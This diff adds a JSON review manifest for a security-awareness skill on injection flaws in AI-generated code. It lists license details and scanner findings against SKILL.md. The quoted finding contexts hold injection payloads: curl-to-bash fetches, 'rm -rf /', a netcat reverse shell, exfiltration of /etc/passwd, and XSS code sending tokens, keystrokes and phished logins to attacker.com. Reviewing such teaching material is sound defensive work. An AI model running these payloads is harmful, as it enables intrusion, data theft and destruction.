@@ -1,0 +1,281 @@
+{
+  "schema_version": "0.1",
+  "skill_id": "harperaa/injection-vulnerabilities-ai-generated-code",
+  "status": "draft",
+  "reviewed_on": null,
+  "reviewer": null,
+  "source": {
+    "repo": "harperaa/secure-claude-skills",
+    "path": "security-awareness/injection-vulnerabilities",
+    "revision": "c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223"
+  },
+  "inventory": {
+    "complete": true,
+    "scope": "security-awareness/injection-vulnerabilities",
+    "url": "https://api.github.com/repos/harperaa/secure-claude-skills/git/trees/c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223?recursive=1",
+    "notes": "Generated from git ls-tree at the pinned revision; confirm no ancestor NOTICE or nested licensing override."
+  },
+  "license": {
+    "spdx": "MIT",
+    "scope": "repository",
+    "path": "LICENSE.txt",
+    "source_path": "LICENSE",
+    "url": "https://github.com/harperaa/secure-claude-skills/blob/c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223/LICENSE",
+    "ancestor_check": {
+      "complete": true,
+      "overrides": [],
+      "checked": [
+        "security-awareness",
+        "security-awareness/injection-vulnerabilities"
+      ]
+    },
+    "redistributable": true,
+    "scope_reason": "",
+    "obligations": [
+      "Ship a byte-exact copy of the repository-root license, including its copyright notice, with the skill.",
+      "Preserve all upstream text and notices byte-for-byte."
+    ]
+  },
+  "content_review": {
+    "status": "pending",
+    "risk": "unknown",
+    "blocking_findings": [],
+    "capabilities": {},
+    "notes": []
+  },
+  "files": [
+    {
+      "path": "LICENSE.txt",
+      "attached": true,
+      "source_path": "LICENSE",
+      "sha256": "e8f0d88e88dafeb5ba3503df8babaf5ef1c49323d6c1751c09989d29740fa919",
+      "bytes": 1069,
+      "mode": "100644",
+      "git_blob": "346d6fb05afd34a37fb0b156a612166534ffc7d9",
+      "license": "MIT",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "",
+      "findings": []
+    },
+    {
+      "path": "SKILL.md",
+      "sha256": "c4c01ef724da49ecabc6c4efa02cbf546955943d93b98a08ce9a1e3c4c16f066",
+      "bytes": 18804,
+      "mode": "100644",
+      "git_blob": "66d5a238dd45a0cc5adc4d7d73deeecf313f0542",
+      "license": "MIT",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "",
+      "findings": [
+        {
+          "type": "dynamic-execution",
+          "line": 140,
+          "evidence": "exec(",
+          "context": "    exec(command, (error, stdout, stderr) => {",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 149,
+          "evidence": "curl",
+          "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 149,
+          "evidence": "http://",
+          "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 149,
+          "evidence": "sh",
+          "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 149,
+          "evidence": "bash",
+          "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 193,
+          "evidence": "exec(",
+          "context": "**1. exec() is Simpler:**",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 196,
+          "evidence": "exec(",
+          "context": "- exec() allows shell syntax (pipes, redirects)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "destructive-operation",
+          "line": 212,
+          "evidence": "rm -rf",
+          "context": "inputFile = \"image.jpg; rm -rf /\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 212,
+          "evidence": "rm -rf",
+          "context": "inputFile = \"image.jpg; rm -rf /\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "destructive-operation",
+          "line": 213,
+          "evidence": "rm -rf",
+          "context": "// Executes: convert image.jpg -quality 80 output.jpg; rm -rf /",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 213,
+          "evidence": "rm -rf",
+          "context": "// Executes: convert image.jpg -quality 80 output.jpg; rm -rf /",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "shell-execution",
+          "line": 219,
+          "evidence": "bash",
+          "context": "inputFile = \"image.jpg; nc attacker.com 4444 -e /bin/bash\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 226,
+          "evidence": "curl",
+          "context": "inputFile = \"image.jpg; curl -X POST https://attacker.com/data -d @/etc/passwd\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 226,
+          "evidence": "https://",
+          "context": "inputFile = \"image.jpg; curl -X POST https://attacker.com/data -d @/etc/passwd\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 232,
+          "evidence": "exec(",
+          "context": "**exec() vs spawn():**",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 234,
+          "evidence": "exec(",
+          "context": "| Feature | exec() | spawn() |",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 279,
+          "evidence": "https://",
+          "context": "// comment.content = \"<script>fetch('/api/session').then(r=>r.text()).then(t=>fetch('https://attacker.com?token='+t))</script>\"",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 341,
+          "evidence": "https://",
+          "context": "      fetch('https://attacker.com/steal', {",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "credential-access",
+          "line": 351,
+          "evidence": "Credential",
+          "context": "**Attack 2: Credential Harvesting**",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 355,
+          "evidence": "https://",
+          "context": "  document.body.innerHTML += '<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><form action=\"https://attacker.com/phish\"><h2>Session Expired - Please Login</h2><input name=\"username\"><input type=",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "network-access",
+          "line": 366,
+          "evidence": "https://",
+          "context": "    fetch('https://attacker.com/keys?key=' + e.key);",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 392,
+          "evidence": "exec(",
+          "context": "- Shell: `exec(f\"convert {filename}\")`",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 430,
+          "evidence": "exec(",
+          "context": "❌ **exec() with user input:**",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 432,
+          "evidence": "exec(",
+          "context": "exec(`command ${userInput}`)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 433,
+          "evidence": "exec(",
+          "context": "exec(\"command \" + userInput)",
+          "disposition": "pending",
+          "reason": ""
+        },
+        {
+          "type": "dynamic-execution",
+          "line": 500,
+          "evidence": "exec(",
+          "context": "  exec(`convert ${filename} output.jpg`); // VULNERABLE",
+          "disposition": "pending",
+          "reason": ""
+        }
+      ]
+    }
+  ]
+}
